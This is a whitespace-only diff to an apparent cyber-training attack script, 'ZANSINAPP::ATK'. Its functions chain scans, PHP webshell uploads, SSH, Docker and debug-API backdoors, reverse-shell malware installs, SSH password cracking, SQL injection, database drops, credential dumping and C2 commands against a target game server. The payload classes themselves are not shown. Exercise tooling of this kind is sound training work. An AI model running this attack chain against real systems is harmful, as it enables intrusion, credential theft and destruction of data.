@@ -58,6 +58,7 @@ flags = {
     #"drop_db"          : False,
 }
 
+
 def show_banner(utility):
     banner = """
 ███████╗ █████╗ ███╗   ██╗███████╗██╗███╗   ██╗ █████╗ ██████╗ ██████╗        █████╗ ████████╗██╗  ██╗
@@ -72,12 +73,14 @@ def show_banner(utility):
     show_credit(utility)
     time.sleep(utility.banner_delay)
 
+
 # Show credit.
 def show_credit(utility):
     credit = u"""
        =[ Version : ZANSINAPP::ATK v0.0.2                  ]=
     """
     utility.print_message(NONE, credit)
+
 
 def wrap_text(type, text):
     if type == OK:
@@ -90,6 +93,7 @@ def wrap_text(type, text):
         return WARN_YELLOW + text + ENDC
     else:
         return text
+
 
 def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_num, user_agent):
     debug = False
@@ -116,7 +120,6 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         
     show_banner(utility)
 
-
     def nmap(wait):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Nmap Scan" % (utility.get_current_date())))
@@ -124,7 +127,6 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         open_ports = atk.sendattack()
         utility.print_message(OK, wrap_text(OK, "open_ports: {}".format(open_ports)))
         return True
-    
 
     def nikto(wait):
         time.sleep(wait * ratio)
@@ -133,23 +135,20 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         atk = AtkNikto(utility, target, "nikto", debug)
         atk.sendattack()
         return True
-    
-    
+
     def upload_webshell(wait):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Upload PHP: WebShell" % (utility.get_current_date())))
         atk = AtkUploadPHP(utility, target, "80", debug)
         flags["upload_webshell"] = atk.sendattack("./attack/public/login.php")
         return True
-    
-    
+
     def upload_cheatfile(wait):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Upload PHP: Cheat User Page" % (utility.get_current_date())))
         atk = AtkUploadPHP(utility, target, "80", debug)
         flags["upload_cheatfile"] = atk.sendattack("./attack/public/new_user.php")
         return True
-    
 
     def backdoor_ssh(wait):
         time.sleep(wait * ratio)
@@ -168,7 +167,6 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         else:
             utility.print_message(OK, wrap_text(OK, "%s:[SKIP] The backdoor is already installed :SSH Exploit: set backdoor" % (utility.get_current_date())))
         return True
-    
 
     def backdoor_docker(wait):
         time.sleep(wait * ratio)
@@ -182,8 +180,7 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         else:
             utility.print_message(OK, wrap_text(OK, "%s:[SKIP] The backdoor is already installed :Docker API Exploit: set backdoor" % (utility.get_current_date())))
         return True
-    
-    
+
     def backdoor_debug(wait):
         time.sleep(wait * ratio)
         if flags["install_backdoor"] == False:
@@ -196,8 +193,7 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         else:
             utility.print_message(OK, wrap_text(OK, "%s:[SKIP] The backdoor is already installed :Debug API Exploit: set backdoor" % (utility.get_current_date())))
         return True
-    
-    
+
     def install_malware_rsh(wait):
         time.sleep(wait * ratio)
         if flags["install_backdoor"] == True:
@@ -211,8 +207,7 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         else:
             utility.print_message(OK, wrap_text(OK, "%s:[SKIP] The backdoor is not installed :ReverseShell Exploit: set backdoor" % (utility.get_current_date())))
         return True
-    
-    
+
     def install_malware_ssh(wait):
         time.sleep(wait * ratio)
         success = False
@@ -236,48 +231,42 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
                     utility.print_message(OK, wrap_text(OK, "stdout: {}".format(stdout)))
                     break
         return True
-    
-    
+
     def cheat_user_sqli1(wait, option):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Login SQLi1" % (utility.get_current_date())))
         atk = AtkGameCheatSQLi(utility, target, "80", debug)
         atk.sendattack("/login", option)
         return True
-    
-        
+
     def cheat_user_sqli2(wait, option):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Create SQLi2" % (utility.get_current_date())))
         atk = AtkGameCheatSQLi(utility, target, "80", debug)
         atk.sendattack("/create", option)
         return True
-    
-    
+
     def cheat_user_php(wait, option):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Backdoor Create Cheat User" % (utility.get_current_date())))
         atk = AtkBackdoorCreateCheatUser(utility, target, "80", debug)
         atk.sendattack("/images/players/new_user.php", option) # backdoor path, num of create user(s)
         return True
-    
-    
+
     def cheat_battle(wait, option):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Game Cheat Battle Leveling" % (utility.get_current_date())))
         atk = AtkGameCheatBattleLeveling(utility, target, "80", debug)
         atk.sendattack(option, 4123) # num of create user(s), exp
         return True
-    
-    
+
     def exploit_userlist_ban(wait, option):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Game Cheat UserList Ban" % (utility.get_current_date())))
         atk = AtkGameCheatUserListBan(utility, target, "80", debug)
         atk.sendattack(option, True) # num of delete user(s), reverse flag
         return True
-    
-        
+
     def passcrack_ssh(wait):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Password Cracking SSH" % (utility.get_current_date())))
@@ -289,7 +278,6 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
                 utility.print_message(OK, wrap_text(OK, "password: {}".format(pwd)))
                 break
         return True
-    
 
     def cheat_dump_player(wait, option):
         time.sleep(wait * ratio)
@@ -297,7 +285,6 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         atk = AtkGameCheatDumpCredentials(utility, target, "80", debug)
         atk.sendattack(option, False, True) # num of delete user(s), delete flag, reverse flag
         return True
-    
 
     def cheat_dump_player_delete(wait, option):
         time.sleep(wait * ratio)
@@ -305,8 +292,7 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         atk = AtkGameCheatDumpCredentials(utility, target, "80", debug)
         atk.sendattack(option, True, True) # num of delete user(s), delete flag, reverse flag
         return True
-    
-    
+
     def cheat_gacha(wait, option):
         time.sleep(wait * ratio)
         # this attack is working in background because the script uses too much time. 
@@ -314,8 +300,7 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         atk = AtkGameCheatZeroCostGacha(utility, target, debug)
         atk.sendattack(0.1, option) # interval, count
         return True
-    
-    
+
     def exploit_index_docker(wait):
         time.sleep(wait * ratio)
         if flags["index_tamparing"] == False:
@@ -325,8 +310,7 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
             b64cmd = base64.b64encode(cmd.encode()).decode()
             atk.sendattack(b64cmd)
         return True
-    
-    
+
     def exploit_index_debug(wait):
         time.sleep(wait * ratio)
         if flags["index_tamparing"] == False:
@@ -336,24 +320,21 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
             b64cmd = base64.b64encode(cmd.encode()).decode()
             atk.sendattack("/debug/login", b64cmd)
         return True
-    
-    
+
     def drop_db1(wait):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Drop Database SQLi Exploit: Login" % (utility.get_current_date())))
         atk = AtkDropDBSQLi(utility, target, "80", debug)
         atk.sendattack("/login")
         return True
-    
-    
+
     def drop_db2(wait):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:Drop Database SQLi Exploit: Create User" % (utility.get_current_date())))
         atk = AtkDropDBSQLi(utility, target, "80", debug)
         atk.sendattack("/create")
         return True
-    
-    
+
     def wall_c2(wait):
         time.sleep(wait * ratio)
         utility.print_message(OK, wrap_text(OK, "%s:C2 Command: wall" % (utility.get_current_date())))
@@ -387,7 +368,6 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
     #dnsserver = AtkDnsServer(debug)
     time.sleep(5)
 
-
     #===========================================================================
     # Executing Scenario
     #===========================================================================
@@ -408,25 +388,12 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
     for th in threads:
         th.join()
 
-
     #===========================================================================
     # 99. Stop some processes
     #===========================================================================
     time.sleep(5)
     atk_stop_process.stop()
 
-
     utility.print_message(NOTE, "Finish!")
 
     sys.exit(0)
-
-
-
-
-
-
-
-
-
-
-
